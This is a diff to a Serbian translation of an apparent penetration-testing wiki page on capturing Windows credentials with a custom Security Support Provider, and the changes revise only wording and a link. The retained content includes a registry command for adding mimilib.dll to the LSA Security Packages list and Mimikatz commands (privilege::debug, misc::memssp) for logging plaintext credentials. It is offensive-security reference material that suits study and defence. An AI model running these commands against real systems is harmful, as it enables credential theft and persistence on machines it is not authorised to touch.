@@ -4,7 +4,7 @@
 
 ### Custom SSP
 
-[Saaznajte šta je SSP (Security Support Provider) ovde.](../authentication-credentials-uac-and-efs/#security-support-provider-interface-sspi)\
+[Learn what is a SSP (Security Support Provider) here.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
 Možete kreirati **svoj SSP** da **zabeležite** u **čistom tekstu** **akreditive** korišćene za pristup mašini.
 
 #### Mimilib
@@ -18,7 +18,7 @@ PS C:\> reg query hklm\system\currentcontrolset\control\lsa\ /v "Security Packag
 HKEY_LOCAL_MACHINE\system\currentcontrolset\control\lsa
 Security Packages    REG_MULTI_SZ    kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u
 ```
-Dodajte `mimilib.dll` na listu pružatelja bezbednosti (Security Packages):
+Dodajte `mimilib.dll` na listu provajdera za podršku bezbednosti (Security Packages):
 ```powershell
 reg add "hklm\system\currentcontrolset\control\lsa\" /v "Security Packages"
 ```
@@ -26,7 +26,7 @@ I nakon ponovnog pokretanja, sve akreditive možete pronaći u čistom tekstu u 
 
 #### U memoriji
 
-Takođe možete ovo ubrizgati direktno u memoriju koristeći Mimikatz (imajte na umu da može biti malo nestabilno/ne radi):
+Takođe možete ovo injektovati direktno u memoriju koristeći Mimikatz (imajte na umu da može biti malo nestabilno/ne radi):
 ```powershell
 privilege::debug
 misc::memssp
